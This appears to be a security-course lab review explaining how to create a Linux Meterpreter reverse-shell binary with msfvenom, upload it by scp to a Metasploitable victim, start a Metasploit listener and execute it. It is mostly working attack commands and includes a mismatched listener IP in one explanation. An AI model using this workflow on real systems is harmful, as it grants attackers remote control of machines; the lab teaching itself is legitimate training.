## Review Creating Malicious Binaries

When creating malicious binaries for any platform, you will need to follow the four basic steps: 

- Create the Executable
- Upload the Payload
- Start a Listener
- Execute the Payload 



**Creating the Executable**

Launch a Terminal in your Kali instance, and run: `msfvenom --arch x86 --platform linux --payload linux/x86/meterpreter/reverse_tcp LHOST=198.51.100.50 LPORT=4444 --format elf -o /tmp/shell.elf`.
Take a closer look at each of the flags: 
- The `--arch` flag tells `msfvenom` to create an executable that will run on x86 architecture. This is the most common CPU architecture in use, and can be found on both Linux and Windows machine.  
- The `--platform` flag specifies the target operating system—Linux, Windows, etc.
- The `--payload` flag lets you specify exactly how you want your victim to connect back to you. For example, you can open a raw TCP connection, or a full Meterpreter session. Meterpreter is the most common choice of payload.
- The `LHOST` and `LPORT` options specify your IP address, and the port on which you'll be listening for connections.

- The file `shell.elf` contains a program that will open a Meterpreter connection to your computer's port `4444`.

Remember, this is to exploit a Linux host, not a Windows host. If you wanted to exploit a Windows host you would need to select a different architecture, platform, and payload. 

**Uploading the Payload**

There are several ways to do this, but for this activity you were asked to use `scp`.

`scp /tmp/shell.elf msfadmin@192.168.11.8:/tmp`

**Starting a Listener**

- Remember that, when you run the payload, it will attempt to connect to your machine's port `4444`. Use the snippet below to start a listener:
    
  ```bash
  msf > use multi/handler
  msf > exploit(multi/handler) > set LPORT 4444
  msf > exploit(multi/handler) > set LHOST 198.51.100.50
  msf > set payload linux/x86/meterpreter/reverse_tcp
  msf > exploit(multi/handler) > run -j
  ```

Take a closer look at each of the flags:
    
- `use multi/handler` selects the module to use.     
- `set LPORT 4444` instructs Metasploit to listen on port 4444. 
- `set LHOST 198.51.100.50` instructs Metasploit to listen on the interface with ip address `192.168.1.10`. 
- `set payload linux/x86/meterpreter/reverse_tcp` instructs the `multi/handler` exploit to use the Linux `reverse_tcp` payload. 
- `run -j` runs the listener in the background, so you can use the command line while you wait for a connection. 



**Executing the Payload**

Run these on the victim machine through an SSH connection:


Move into the directory where `shell.elf` lives:
- Type: `msfadmin@metasploitable:~$ cd /tmp`
  
Make `shell.elf` executable:
- Type: `msfadmin@metasploitable:~$ chmod +x shell.elf`
  
Run `shell.elf` to open a Meterpreter connection to the attacking machine:
- Type: `msfadmin@metasploitable:~$ ./shell.elf`

